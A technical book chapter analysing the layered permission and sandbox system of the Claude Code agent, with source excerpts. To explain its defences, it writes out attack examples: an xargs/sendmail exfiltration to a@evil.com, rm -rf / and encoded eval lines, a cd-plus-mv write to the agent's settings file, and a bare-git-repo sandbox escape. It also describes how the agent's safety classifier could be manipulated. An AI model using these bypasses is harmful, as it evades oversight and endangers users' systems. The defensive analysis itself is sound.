# Chapter 10: Security and Permission Model

## 10.1 Overview and Purpose

Claude Code's security model is the largest and most complex subsystem in the entire system, involving approximately 25,000 lines of TypeScript source code. The core problem it solves is: **how to grant an AI agent the ability to execute shell commands and modify files while preventing malicious instruction injection, data exfiltration, and system damage**.

Unlike traditional IDE plugins, Claude Code faces a unique threat model: the AI model itself can be guided by prompt injection to execute dangerous operations, and malicious repositories cloned in the codebase can construct attack vectors through file names or content. The security system must establish a trusted verification layer between **model output** and the **operating system**.

The entire security subsystem can be summarized in one formula:

```
Final Decision = f(permission mode, rule matching, AST analysis, security validators, path validation, classifier, Hook, sandbox)
```

This is not a single-layer filter but an 8-layer defense-in-depth system, where each layer is independently usable and layers stack on top of each other.

## 10.2 Theoretical Foundation

### 10.2.1 Principle of Least Privilege

Claude Code defaults to denying all write operations — every tool call must obtain authorization through `checkPermissions`. Permission modes range from most restrictive (`default` — ask every time) to most permissive (`bypassPermissions`), with users actively choosing their trust level.

### 10.2.2 Sandboxing

Integrates `@anthropic-ai/sandbox-runtime`, using `sandbox-exec` on macOS and `bubblewrap` (bwrap) on Linux to isolate file system and network access at the operating system level. The sandbox is independent of application-layer permission checks — even if the application layer makes a mistake, the OS layer still blocks.

### 10.2.3 AST Analysis in Security

Unlike traditional regex matching, Claude Code uses a full Bash AST parser (a tree-sitter compatible parser implemented in pure TypeScript) to understand command structure. This is the cornerstone of security validation — regex cannot distinguish between `echo "rm -rf /"` and `rm -rf /`, but AST can.

### 10.2.4 Defense in Depth

Security checks are distributed across 8 independent layers; any single layer intercepting can block a dangerous operation. Even if an attacker bypasses AST parsing (e.g., exploiting a parser differential), path validation, sandbox, and user confirmation still serve as fallbacks.

## 10.3 Permission Model Architecture

### 10.3.1 Five Permission Levels

Permission modes are defined in `utils/permissions/PermissionMode.ts`; there are five levels in actual operation:

| Mode | Behavior | Applicable Scenario |
|------|----------|-------------------|
| `default` | Ask user on every tool call | First use, high-risk environments |
| `acceptEdits` | File edits pass automatically, commands still require confirmation | Daily development |
| `plan` | Generate plan only, no execution | Architecture design, code review |
| `auto` | LLM classifier makes automatic decisions | High-trust developers |
| `bypassPermissions` | Skip all permission checks | Fully trusted scenarios (can be disabled by policy) |

Mode switching has complete state transition logic (`permissionSetup.ts:transitionPermissionMode`), including:

- Entering `auto` mode: automatically strips dangerous permission rules (`stripDangerousPermissionsForAutoMode`)
- Exiting `auto` mode: restores stripped rules (`restoreDangerousPermissions`)
- `plan` mode can embed `auto` mode (plan + auto-during-plan)

```typescript
// permissionSetup.ts:~580
export function transitionPermissionMode(
  fromMode: string,
  toMode: string,
  context: ToolPermissionContext,
): ToolPermissionContext {
  if (fromMode === toMode) return context
  // ...
  if (toUsesClassifier && !fromUsesClassifier) {
    autoModeStateModule?.setAutoModeActive(true)
    context = stripDangerousPermissionsForAutoMode(context)
  } else if (fromUsesClassifier && !toUsesClassifier) {
    autoModeStateModule?.setAutoModeActive(false)
    context = restoreDangerousPermissions(context)
  }
}
```

### 10.3.2 Permission Rule System

Permission rules are the core of fine-grained control, stored in multi-level configurations:

```typescript
// permissions.ts:~95
const PERMISSION_RULE_SOURCES = [
  ...SETTING_SOURCES, // userSettings, projectSettings, localSettings, flagSettings, policySettings
  'cliArg',
  'command',
  'session',
] as const
```

Each rule contains three dimensions:
- **Source** (source level): policySettings > flagSettings > localSettings > projectSettings > userSettings > session
- **Behavior**: `allow` / `deny` / `ask`
- **RuleValue** (matching pattern): e.g., `Bash(git commit:*)` means allow all commands starting with `git commit`

Rule matching supports three patterns:
1. **Tool-level matching**: `Bash` matches all Bash commands
2. **Prefix matching**: `Bash(npm run:*)` matches commands starting with `npm run`
3. **Exact matching**: `Bash(ls -la)` only matches this one command

### 10.3.3 Complete Permission Cascade Flow

A Bash command permission check flows through `bashToolHasPermission` (`bashPermissions.ts`), with the complete path:

```
1. Mode check → bypassPermissions passes directly
2. deny rule matching → reject if matched
3. allow rule matching → allow if matched
4. Safety mode check → special handling for acceptEdits etc.
5. Command AST parsing → tree-sitter produces structured command
6. Security validator chain → 23 static checks
7. Read-only validation → command allowlist + flag allowlist
8. Path validation → working directory constraints
9. LLM classifier (optional) → AI decision in auto mode
10. User confirmation → final fallback
```

## 10.4 Bash Command Security — Eight-Step Classification Flow

### 10.4.1 Tree-sitter AST Parsing

This is the most core innovation in the entire security system. `utils/bash/ast.ts` implements AST-based bash command analysis:

```typescript
// ast.ts:~1-20
/**
 * AST-based bash command analysis using tree-sitter.
 *
 * The key design property is FAIL-CLOSED: we never interpret structure we
 * don't understand. If tree-sitter produces a node we haven't explicitly
 * allowlisted, we refuse to extract argv and the caller must ask the user.
 *
 * This is NOT a sandbox. It answers exactly one question: "Can we produce
 * a trustworthy argv[] for each simple command in this string?"
 */
```

AST parsing output types:

```typescript
// ast.ts:~30
export type ParseForSecurityResult =
  | { kind: 'simple'; commands: SimpleCommand[] }
  | { kind: 'too-complex'; reason: string; nodeType?: string }
  | { kind: 'parse-unavailable' }
```

Key design: **Fail-Closed + Allowlist**. Any AST node type not in the allowlist causes the entire command to be marked as `too-complex`, requiring user confirmation. The `DANGEROUS_TYPES` set defines known-dangerous node types:

```typescript
// ast.ts:~190
const DANGEROUS_TYPES = new Set([
  'command_substitution',   // $() command substitution
  'process_substitution',   // <() >() process substitution
  'expansion',              // parameter expansion
  'subshell',               // subshell
  'for_statement',          // control flow
  'if_statement',
  'function_definition',
  'brace_expression',       // brace expansion
  // ... 18 types total
])
```

### 10.4.2 Pure TypeScript Bash Parser

`utils/bash/bashParser.ts` (4,436 lines) is a complete Bash syntax parser producing an AST compatible with the tree-sitter-bash WASM parser. Key design parameters:

```typescript
// bashParser.ts:~28
const PARSE_TIMEOUT_MS = 50    // 50ms timeout, prevents malicious input
const MAX_NODES = 50_000       // node count limit, prevents OOM
```

The parser supports complete Bash syntax including heredoc, ANSI-C strings, process substitution, etc. On timeout or node explosion, it directly returns `null` — fail-closed.

### 10.4.3 LLM Classifier (Bash Classifier)

Used for `auto` mode. `bashClassifier.ts` maintains three sets of command description rules:

- **Allow descriptions**: describing which commands are safe (e.g., "git read-only operations")
- **Deny descriptions**: describing which commands are dangerous (e.g., "commands that download and execute code")
- **Ask descriptions**: patterns requiring user confirmation

The classifier uses `sideQuery` to call an independent Claude instance for judgment, completely isolated from the main conversation.

### 10.4.4 Environment Variable Filtering

`bashPermissions.ts` defines two sets of safe environment variable allowlists:

```typescript
// bashPermissions.ts:~390
const SAFE_ENV_VARS = new Set([
  'NODE_ENV', 'RUST_LOG', 'PYTHONUNBUFFERED', 'LANG', 'TZ',
  'NO_COLOR', 'FORCE_COLOR', // ... ~40 total
])
```

**The security comments are particularly valuable** — the source code explicitly marks which variables must **never** be added to the allowlist:

```typescript
// bashPermissions.ts:~385 (comment)
// SECURITY: These must NEVER be added to the whitelist:
// - PATH, LD_PRELOAD, LD_LIBRARY_PATH, DYLD_* (execution/library loading)
// - PYTHONPATH, NODE_PATH (module loading)
// - NODE_OPTIONS (can contain code execution flags)
// - HOME, TMPDIR, SHELL, BASH_ENV (affect system behavior)
```

### 10.4.5 23 Shell Security Validators

`bashSecurity.ts` implements 23 independent validators, each with a unique numeric ID:

```typescript
// bashSecurity.ts:~76
const BASH_SECURITY_CHECK_IDS = {
  INCOMPLETE_COMMANDS: 1,
  JQ_SYSTEM_FUNCTION: 2,
  JQ_FILE_ARGUMENTS: 3,
  OBFUSCATED_FLAGS: 4,
  SHELL_METACHARACTERS: 5,
  DANGEROUS_VARIABLES: 6,
  NEWLINES: 7,
  DANGEROUS_PATTERNS_COMMAND_SUBSTITUTION: 8,
  DANGEROUS_PATTERNS_INPUT_REDIRECTION: 9,
  DANGEROUS_PATTERNS_OUTPUT_REDIRECTION: 10,
  IFS_INJECTION: 11,
  GIT_COMMIT_SUBSTITUTION: 12,
  PROC_ENVIRON_ACCESS: 13,
  MALFORMED_TOKEN_INJECTION: 14,
  BACKSLASH_ESCAPED_WHITESPACE: 15,
  BRACE_EXPANSION: 16,
  CONTROL_CHARACTERS: 17,
  UNICODE_WHITESPACE: 18,
  MID_WORD_HASH: 19,
  ZSH_DANGEROUS_COMMANDS: 20,
  BACKSLASH_ESCAPED_OPERATORS: 21,
  COMMENT_QUOTE_DESYNC: 22,
  QUOTED_NEWLINE: 23,
}
```

Several validators worth noting:

**Command substitution detection** — not only detects `$()`, but also covers Zsh-specific attack surfaces:

```typescript
// bashSecurity.ts:~16
const COMMAND_SUBSTITUTION_PATTERNS = [
  { pattern: /<\(/, message: 'process substitution <()' },
  { pattern: />\(/, message: 'process substitution >()' },
  { pattern: /=\(/, message: 'Zsh process substitution =()' },
  { pattern: /(?:^|[\s;&|])=[a-zA-Z_]/, message: 'Zsh equals expansion (=cmd)' },
  { pattern: /\$\(/, message: '$() command substitution' },
  { pattern: /\$\{/, message: '${} parameter substitution' },
  // ... also includes defensive interception of PowerShell comment syntax
  { pattern: /<#/, message: 'PowerShell comment syntax' },
]
```

**Zsh dangerous command interception** — `zmodload` is the entry point to Zsh's module system, capable of loading `zsh/system` (file I/O), `zsh/net/tcp` (network communication), and other modules:

```typescript
// bashSecurity.ts:~44
const ZSH_DANGEROUS_COMMANDS = new Set([
  'zmodload',   // module loading entry point
  'emulate',    // -c flag is eval equivalent
  'sysopen', 'sysread', 'syswrite',  // zsh/system module
  'zpty',       // pseudo-terminal command execution
  'ztcp',       // TCP network communication
  'zf_rm', 'zf_mv', 'zf_chmod',     // zsh/files built-in commands
  // ...
])
```

### 10.4.6 Read-Only Validation Mechanism

`readOnlyValidation.ts` maintains a **command allowlist + flag allowlist** system. With `COMMAND_ALLOWLIST` as the core:

```typescript
// readOnlyValidation.ts:~55
const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
  xargs: {
    safeFlags: { '-I': '{}', '-n': 'number', '-P': 'number', ... },
    // note: -i and -e removed due to GNU getopt optional-arg semantic differences
  },
  grep: { safeFlags: { '-e': 'string', '-i': 'none', ... } },
  sort: { safeFlags: { '-r': 'none', '-n': 'none', ... } },
  tree: { safeFlags: { ... } },  // -R removed: tree -R -H writes files
  date: { safeFlags: { ... }, additionalCommandIsDangerousCallback: ... },
  // ... approximately 30 commands total
}
```

Each command's flag allowlist has detailed security comments. For example, `xargs`'s `-i` is removed:

```typescript
// readOnlyValidation.ts:~130 (comment)
// SECURITY: `-i` and `-e` (lowercase) REMOVED — both use GNU getopt
// optional-attached-arg semantics (`i::`, `e::`). The arg MUST be
// attached (`-iX`, `-eX`); space-separated (`-i X`, `-e X`) means the
// flag takes NO arg and `X` becomes the next positional (target command).
//
// `-i` (`i::` — optional replace-str):
//   echo /usr/sbin/sendm | xargs -it tail a@evil.com
//   validator: -it bundle (both 'none') OK, tail ∈ SAFE_TARGET → break
//   GNU: -i replace-str=t, tail → /usr/sbin/sendmail → NETWORK EXFIL
```

This level of security analysis — understanding parser differential attacks caused by GNU getopt optional-arg semantic differences — is the most impressive part of the entire security model.

### 10.4.7 Path Validation and Traversal Protection

`pathValidation.ts` (1,303 lines) implements a complete path security system:

**Path extractors** — dedicated argument parsers defined for 34 command types:

```typescript
// pathValidation.ts:~170
export const PATH_EXTRACTORS: Record<PathCommand, (args: string[]) => string[]> = {
  cd: args => (args.length === 0 ? [homedir()] : [args.join(' ')]),
  find: args => { /* complex flag/path separation logic */ },
  grep: args => parsePatternCommand(args, flags),
  git: args => { /* git diff --no-index special handling */ },
  // ... 34 commands total
}
```

**POSIX `--` handling** — correctly handles the end-of-options separator, preventing `-path`-style arguments from bypassing path validation:

```typescript
// pathValidation.ts:~105
// SECURITY: `rm -- -/../.claude/settings.local.json`
// Here `-/../.claude/settings.local.json` starts with `-`,
// a naive !arg.startsWith('-') filter would discard it if `--` is not handled,
// making the validator see 0 paths, return passthrough, and the file gets deleted.
function filterOutFlags(args: string[]): string[] {
  const result: string[] = []
  let afterDoubleDash = false
  for (const arg of args) {
    if (afterDoubleDash) { result.push(arg) }
    else if (arg === '--') { afterDoubleDash = true }
    else if (!arg?.startsWith('-')) { result.push(arg) }
  }
  return result
}
```

**Dangerous removal path protection** — even with allowlist rules, `rm` operations on critical paths like `/`, `/etc`, `/home` always require user confirmation:

```typescript
// pathValidation.ts:~70
function checkDangerousRemovalPaths(
  command: 'rm' | 'rmdir', args: string[], cwd: string
): PermissionResult {
  for (const path of paths) {
    if (isDangerousRemovalPath(absolutePath)) {
      return { behavior: 'ask', message: `Dangerous ${command} operation...` }
    }
  }
}
```

**`cd` + write operation combination attack protection**:

```typescript
// pathValidation.ts:~490
// SECURITY: Block write operations in compound commands containing 'cd'
// Example attack: cd .claude/ && mv test.txt settings.json
// This would bypass the check for .claude/settings.json because paths
// are resolved relative to the original CWD.
if (compoundCommandHasCd && operationType !== 'read') {
  return { behavior: 'ask', message: '...' }
}
```

## 10.5 FileEdit Validation Chain

FileEditTool's validation chain is implemented in the `validateInput` method of `FileEditTool.ts`, with 12 steps:

| Step | Check | Source Location |
|------|-------|----------------|
| 1 | Team Memory Secret detection | `checkTeamMemSecrets(fullFilePath, new_string)` |
| 2 | old_string === new_string no-change check | errorCode: 1 |
| 3 | Deny rule matching | `matchingRuleForInput(..., 'deny')` |
| 4 | UNC path security check (prevent NTLM leakage) | `fullFilePath.startsWith('\\\\')` |
| 5 | File size limit (1 GiB) | `MAX_EDIT_FILE_SIZE` |
| 6 | File encoding detection and reading | UTF-8 / UTF-16LE |
| 7 | File existence verification | old_string must be empty if file doesn't exist |
| 8 | Jupyter Notebook interception | Guide to use NotebookEditTool |
| 9 | **Must-Read-Before-Write** check | `readFileState.get(fullFilePath)` |
| 10 | **mtime concurrent modification detection** | `lastWriteTime > readTimestamp.timestamp` |
| 11 | **Uniqueness check** | multiple matches require `replace_all: true` |
| 12 | Settings file special validation | `validateInputForSettingsFileEdit` |

Steps 9 and 10 form the **"read-before-write"** invariant:

```typescript
// FileEditTool.ts:~250
const readTimestamp = toolUseContext.readFileState.get(fullFilePath)
if (!readTimestamp || readTimestamp.isPartialView) {
  return {
    result: false, behavior: 'ask',
    message: 'File has not been read yet. Read it first before writing to it.',
  }
}
// ...
const lastWriteTime = getFileModificationTime(fullFilePath)
if (lastWriteTime > readTimestamp.timestamp) {
  // Windows special handling: cloud sync/antivirus may change mtime without changing content
  if (isFullRead && fileContent === readTimestamp.content) {
    // content unchanged, safely pass
  } else {
    return { result: false, message: 'File has been modified since read...' }
  }
}
```

## 10.6 Sandbox Mechanism

### 10.6.1 Sandbox Adapter Architecture

`utils/sandbox/sandbox-adapter.ts` (985 lines) is the adapter layer for `@anthropic-ai/sandbox-runtime`, mapping Claude Code's settings system to sandbox runtime configuration:

```typescript
// sandbox-adapter.ts:~160
export function convertToSandboxRuntimeConfig(
  settings: SettingsJson,
): SandboxRuntimeConfig {
  const allowWrite: string[] = ['.', getClaudeTempDir()]
  const denyWrite: string[] = []
  
  // always deny writing to settings files — prevents sandbox escape
  denyWrite.push(...settingsPaths)
  denyWrite.push(getManagedSettingsDropInDir())
  
  // deny writing to .claude/skills — same permission level
  denyWrite.push(resolve(originalCwd, '.claude', 'skills'))
  
  // bare Git repository attack protection
  for (const gitFile of ['HEAD', 'objects', 'refs', 'hooks', 'config']) {
    const p = resolve(dir, gitFile)
    try { statSync(p); denyWrite.push(p) }
    catch { bareGitRepoScrubPaths.push(p) }
  }
}
```

### 10.6.2 Bare Git Repository Attack Protection

This is a sophisticated security measure. An attacker can plant `HEAD`, `objects/`, `refs/` files in the cwd to trick Git's `is_git_directory()` into treating the cwd as a bare repository, then execute arbitrary code through `core.fsmonitor` configuration:

```typescript
// sandbox-adapter.ts:~245
// SECURITY: Git's is_git_directory() treats cwd as a bare repo if it has
// HEAD + objects/ + refs/. An attacker planting these (plus a config with
// core.fsmonitor) escapes the sandbox when Claude's unsandboxed git runs.

// Strategy: existing files set as read-only bindings; non-existing files cleaned up after command execution
function scrubBareGitRepoFiles(): void {
  for (const p of bareGitRepoScrubPaths) {
    try { rmSync(p, { recursive: true }) }
    catch { /* ENOENT is normal */ }
  }
}
```

### 10.6.3 Network Isolation Strategy

The sandbox supports domain-level network control, extracting allowed domains from WebFetch tool permission rules:

```typescript
// sandbox-adapter.ts:~190
for (const ruleString of permissions.allow || []) {
  const rule = permissionRuleValueFromString(ruleString)
  if (rule.toolName === WEB_FETCH_TOOL_NAME && 
      rule.ruleContent?.startsWith('domain:')) {
    allowedDomains.push(rule.ruleContent.substring('domain:'.length))
  }
}
```

Enterprise policy can force use of only administrator-configured domains via `allowManagedDomainsOnly`.

## 10.7 Hook System and Permission Interaction

### 10.7.1 PreToolUse / PostToolUse Hook

The Hook system allows users to inject custom security logic. `interactiveHandler.ts` shows how Hooks compete with permission decisions:

```typescript
// interactiveHandler.ts:~68
// Four-way race: user interaction / Hook / classifier / Bridge (CCR)
// Uses claim() atomic operation to ensure only one winner
void (async () => {
  if (isResolved()) return
  const hookDecision = await ctx.runHooks(
    currentAppState.toolPermissionContext.mode,
    result.suggestions,
    result.updatedInput,
    permissionPromptStartTimeMs,
  )
  if (!hookDecision || !claim()) return
  ctx.removeFromQueue()
  resolveOnce(hookDecision)
})()
```

### 10.7.2 Concurrent Race Model for Permission Decisions

`PermissionContext.ts` defines `createResolveOnce` — a "claim-then-resolve" pattern ensuring that when multiple asynchronous sources (user UI, Hook, classifier, Bridge, Channel) compete, only one wins:

```typescript
// PermissionContext.ts:~80
function createResolveOnce<T>(resolve: (value: T) => void): ResolveOnce<T> {
  let claimed = false
  let delivered = false
  return {
    claim() {
      if (claimed) return false
      claimed = true
      return true
    },
    resolve(value: T) {
      if (delivered) return
      delivered = true; claimed = true
      resolve(value)
    },
  }
}
```

This design supports six concurrent competitors:
1. **Local UI** — user clicks Allow/Deny in the terminal
2. **Hook** — PreToolUse hook returns a decision
3. **Bash Classifier** — LLM classifier judges safety
4. **Bridge (CCR)** — Claude.ai Web UI remote decision
5. **Channel** — Telegram/iMessage/etc. channel reply
6. **Recheck** — automatic recheck after rule changes

## 10.8 YOLO Classifier (Auto Mode Classifier)

### 10.8.1 Architecture

`yoloClassifier.ts` (1,495 lines) implements the AI security classifier for `auto` mode. It is an independent Claude instance called via `sideQuery`, completely isolated from the main conversation:

```typescript
// yoloClassifier.ts:~400
const YOLO_CLASSIFIER_TOOL_SCHEMA: BetaToolUnion = {
  type: 'custom',
  name: 'classify_result',
  input_schema: {
    type: 'object',
    properties: {
      thinking: { type: 'string' },
      shouldBlock: { type: 'boolean' },
      reason: { type: 'string' },
    },
  },
}
```

### 10.8.2 Two-Phase XML Classifier

The classifier supports three operating modes (`both` / `fast` / `thinking`), defaulting to a two-phase strategy:

- **Stage 1 (fast)**: max_tokens=64, nudge to immediately give a yes/no decision. If deemed safe, returns directly.
- **Stage 2 (thinking)**: Only triggered when Stage 1 judges "block", using chain-of-thought reasoning to reduce false positives.

```typescript
// yoloClassifier.ts:~680
const XML_S1_SUFFIX = '\nErr on the side of blocking. <block> immediately.'
const XML_S2_SUFFIX = '\nReview the classification process and follow it carefully...'
```

### 10.8.3 Transcript Compression

The classifier does not receive the complete conversation history; instead, it compresses the conversation into a compact format via `buildTranscriptEntries` — retaining only user text and assistant tool_use blocks (excluding assistant text, which could be crafted to influence the classifier):

```typescript
// yoloClassifier.ts:~480
// Only include tool_use blocks — assistant text is model-authored
// and could be crafted to influence the classifier's decision.
if (block.type === 'tool_use') {
  blocks.push({ type: 'tool_use', name: block.name, input: block.input })
}
```

### 10.8.4 Fast-Path Optimization

Before calling the classifier, there are three fast-paths that can skip LLM calls:

1. **acceptEdits simulation**: If the command would be automatically allowed in `acceptEdits` mode, pass directly
2. **Safe-tool allowlist**: `isAutoModeAllowlistedTool` maintains a set of known-safe tools
3. **Denial tracking**: When too many consecutive denials occur, fall back to asking the user directly

### 10.8.5 Dangerous Permission Stripping

When entering `auto` mode, the following permission rules are automatically stripped (`stripDangerousPermissionsForAutoMode`):

```typescript
// permissionSetup.ts:~100
export function isDangerousBashPermission(toolName: string, ruleContent: string | undefined): boolean {
  // Bash(*) — allow all commands
  if (ruleContent === undefined || ruleContent === '') return true
  // python:*, node:*, bash:* — script interpreters
  for (const pattern of DANGEROUS_BASH_PATTERNS) {
    if (content === `${lowerPattern}:*`) return true
    // ...
  }
}
```

This ensures that even if the user previously saved broad rules like `Bash(python:*)`, they won't bypass the classifier in `auto` mode.

## 10.9 Design Decision Analysis

### 10.9.1 Why AST Parsing Rather Than Regex

Regular expressions cannot handle **parser differential** attacks. For example:

```bash
echo "rm -rf /"   # regex would false-positive — this is just an argument to echo
rm -rf /           # regex should only flag this
```

Even more dangerous are **quote nesting** and **shell expansion**:

```bash
ev"al" 'rm -rf /'    # regex might miss the eval
$'\x65\x76\x61\x6c' 'rm -rf /'  # ANSI-C string-encoded eval
```

The AST parser understands syntactic structure and correctly distinguishes command names from arguments. The fail-closed design means any structure that cannot be parsed requires user confirmation.

### 10.9.2 Timing and Tradeoffs of LLM Classifier Introduction

The classifier is only used in `auto` mode, with strict cost control:

- **Latency**: Two-phase design; Stage 1 typically <100ms (max_tokens=64 + prompt cache)
- **Cost**: Uses `sideQuery` for an independent API call, not counted in the main conversation's token consumption
- **Accuracy**: Stage 2's chain-of-thought reduces false positives to a reasonable level
- **Reliability**: Fails closed when classifier is unavailable (falls back to asking user)

### 10.9.3 Balancing Security vs. Usability

Claude Code balances the two through **progressive trust**:

1. First use: every command requires confirmation
2. After saving rules: matching commands pass automatically
3. `acceptEdits` mode: file edits pass automatically
4. `auto` mode: AI classifier decides
5. `bypassPermissions`: full trust

Simultaneously, through **intelligent suggestions** (`suggestionForExactCommand` / `suggestionForPrefix`), users are guided to gradually build trust rules rather than making all-or-nothing choices.

### 10.9.4 Comparison with Competitor Security Models

| Dimension | Claude Code | Cursor | GitHub Copilot |
|-----------|------------|--------|----------------|
| Command analysis | AST parsing + 23 validators | Basic regex | No command execution |
| Sandbox | OS-level (sandbox-exec/bwrap) | None | N/A |
| Permission model | 5 levels + fine-grained rules | Binary (allow/deny) | N/A |
| AI classifier | Independent LLM instance | None | None |
| Path validation | 34 command-specific parsers | Basic checks | N/A |
| Enterprise policy | policySettings layer | Limited | Organization policy |

## 10.10 Transferable Patterns

1. **Fail-Closed Allowlist Pattern**: The core principle of AST parsing — only understand known-safe structures, reject everything else. Applicable to any scenario requiring parsing of untrusted input.

2. **Claim-then-Resolve Concurrent Pattern**: `createResolveOnce` solves the problem of multiple asynchronous sources competing for a decision. Reusable in any scenario needing "the first arriving decision-maker wins."

3. **Progressive Trust Escalation**: Start from the most restrictive mode and gradually build trust rules through user behavior. More psychologically natural than "requiring trust level selection from the start."

4. **Classifier Fast-Path + Two-Phase**: Use rules/allowlists/simulation to skip clearly safe operations first, only calling LLM for uncertain cases. Two-phase strategy (fast + thinking) balances latency and accuracy.

5. **Parser Differential Defense**: Not only using one's own parser, but also systematically checking shell feature differences (GNU vs BSD getopt, Zsh vs Bash expansion rules). This thinking approach is transferable to any system involving multiple interpreter layers.

6. **Source Hierarchy for Permission Rules**: Multi-layer configuration merging (policy > flag > local > project > user > session), enterprise policy always wins. A universal configuration priority model.

7. **Sandbox + Application Layer Dual Insurance**: Even if application-layer permission checks are bypassed, the OS sandbox still blocks — and vice versa. Two layers fail independently.

## 10.11 Source Index

| File | Lines | Core Function |
|------|-------|--------------|
| `tools/BashTool/bashPermissions.ts` | 2,621 | Bash permission decision main entry, rule matching, command prefix extraction |
| `tools/BashTool/bashSecurity.ts` | 2,592 | 23 security validators, quote parsing, command substitution detection |
| `tools/BashTool/readOnlyValidation.ts` | 1,990 | Command allowlist, flag allowlist, read-only validation |
| `tools/BashTool/pathValidation.ts` | 1,303 | Path extractors for 34 commands, dangerous path detection |
| `tools/BashTool/BashTool.tsx` | 1,143 | Bash tool entry, input schema, execution logic |
| `tools/BashTool/prompt.ts` | 369 | Bash tool prompt, sandbox description |
| `tools/FileEditTool/FileEditTool.ts` | ~400 | File edit 12-step validation chain |
| `utils/permissions/permissions.ts` | 1,486 | Permission decision main entry, rule matching, auto mode integration |
| `utils/permissions/permissionSetup.ts` | 1,532 | Permission mode configuration, dangerous rule detection and stripping |
| `utils/permissions/yoloClassifier.ts` | 1,495 | Auto mode LLM classifier, two-phase XML protocol |
| `utils/permissions/filesystem.ts` | 1,777 | File system permissions, path security, Claude config protection |
| `utils/bash/ast.ts` | 2,679 | Bash AST analysis, allowlist node traversal |
| `utils/bash/bashParser.ts` | 4,436 | Pure TypeScript Bash parser |
| `hooks/toolPermission/handlers/interactiveHandler.ts` | 536 | Interactive permission handling, six-way race model |
| `hooks/toolPermission/PermissionContext.ts` | 388 | Permission context, claim-then-resolve |
| `utils/sandbox/sandbox-adapter.ts` | 985 | Sandbox configuration adapter, bare Git repository protection |

---
